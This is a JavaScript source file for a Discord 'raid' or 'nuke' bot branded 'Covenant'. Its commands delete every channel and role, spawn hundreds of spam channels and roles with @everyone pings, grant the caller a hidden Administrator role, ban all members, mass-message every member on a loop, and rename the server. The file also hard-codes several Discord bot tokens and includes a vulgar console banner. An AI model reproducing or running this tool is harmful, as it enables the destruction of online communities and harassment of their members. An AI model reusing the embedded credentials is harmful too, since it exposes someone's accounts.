//Raishin es mi proyecto y no de nadie mas.
const Discord = require("discord.js");
const client = new Discord.Client();
const Monitor = require('ping-monitor');
const keepAlive = require('./server');
const chalk = require('chalk');

client.on("ready", () => {

  console.log(chalk.red(`
Bot Encendido Cliente ${client.user.tag}
  `))



  console.log(chalk.Red(`
         ⢩⢩⢩⢩⢩⢩⢪
         ⢩⢪⢀⢩⢪⢀⢩
         ⢩⢪⢀⢩⡀⢪⢀
  ⢩⢩⢩⢩⢩⢩⢩⢪⢀⢩⢪⢀⢩⢩⢩⢩⢩⢩⢩⢪⢪
  ⢩⢪⢀⠀⢑⢸⢌⢖⢩ ⭕⢪⢀⢪⢀⢪⢩⢩⢩⢪
  ⢩⢩⢩⢩⢩⢩⢩ ⠐⠡⡑⠜⢎⢪⢩⢩⢩⢩⢩⢪⢩
         ⢩⢪⢀⢩⢩⡀⢪⢀
         ⢩⠀⢑⢸⢌⢖⢩
         ⢩⢩⡀⢪⢀⢪⢀
         ⢑⢸⢌⢖⢠⢀⠪⡂
          Youɳg
  Hydra chupame la pija

`))


  presencia();9
});

keepAlive();
const monitor = new Monitor({
  website: 'https://sombras-2.markox36.repl.co',
  title: 'Secundario',
  interval: 15 // minutes
});

////////Monitor//////////
monitor.on('up', (res) => console.log(`${res.website} está encedido.`));
monitor.on('down', (res) => console.log(`${res.website} se ha caído - ${res.statusMessage}`));
monitor.on('stop', (website) => console.log(`${website} se ha parado.`));
monitor.on('error', (error) => console.log(error));
//////////////////////

function presencia() {
  client.user.setPresence({
    status: "Idle",
    activity: {
      name: "Bot oficial de Covenant ",
      type: "PLAYING"

    }
  });
}


//automatico

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.z') {

    console.log(chalk.red(`                                                                     [+] Raid en ejecutado`))


    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Covenant-is-here`, {
      type: 'text'
    }).then(channel => {
      channel.send("Covenant fuck this ")
    })
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`PwnedbyYoung`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg ");
   channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg "); channel.send("@everyone Raid by Young  https://www.youtube.com/channel/UCygDkCuBEzr5WVfcNSku4OA               https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg ");











      })
    }
    // message.guild.setName("100% made");
    //message.guild.setIcon("https://i.pinimg.com/564x/95/87/a7/9587a7eac1a33e042a570e375e5c783e.jpg");
  }
})


//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.hola')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: "ㅤ",
        color: "#ffffff",
        permissions: "Administrator",
        hoisted: false
      }
    })

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});


//lista


client.on("message", message => {


  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.lista') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("Informacion de proceso del raid")
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RED");
    message.channel.send(embed)
  }
});


//banall

client.on("message", async message => {
  if (message.content.startsWith('.banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
        member.ban();
      }
    })
  }
});


//nuke 

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.Cove') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Fucked by Cøvenąnt`, {
      type: 'text'
    }).then(channel => {
      channel.send("  @everyone RaidbyCøvenąnt")

      message.guild.setName("Controled x Covenant");
      message.guild.setIcon("https://cdn.discordapp.com/attachments/970082970323013685/997347528850817136/14f89daddccc2c49e690a68b41f9ed79.jpg");
    })
  }
})


//chats

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === '.a') {
    message.delete()
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(``, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone **Fuck by  ** https://discord.gg/gif");





      })
    }
  }
});

//mdall

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === ".mdall")
    message.delete()
  message.guild.members.cache.forEach(member => {
    setInterval(function() {
      member.send("Covenant infecto esta mierda").catch(error => { });
    }, 450);
  })
});


//borrar roles

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('.eliminarroles')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '.crearroles') {
    message.delete()
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `Fxcked`, color: '#d41818', }, reason: 'razon', })
    };
  }
});


//client.login("OTYyOTUwODA2MDU3OTI2NjU2.Gfr_TE.hIZZmOSmWVweKsdM04c56pFMqfrRllA3R_xZRQ")

//client.login("OTg0Mjg1MTM3OTUwODY3NTE2.GDzhs-.7SZYdkUUqNxSRefjw7gZ06XHUifcykpHpSfswU")

//client.login("OTk3MzQ4OTQ3OTQ3NDQyMzA3.GEA-0G.jgexU-YwbZ4ndyoMFau0zsHNoDRIOn0XhzA2vo")
client.login("MTAwMjY0OTI1NTQxODI4NjE4MA.GyCadX.2dfMLntBnDl2j_egopswr800e2qeswj4WHCdro")
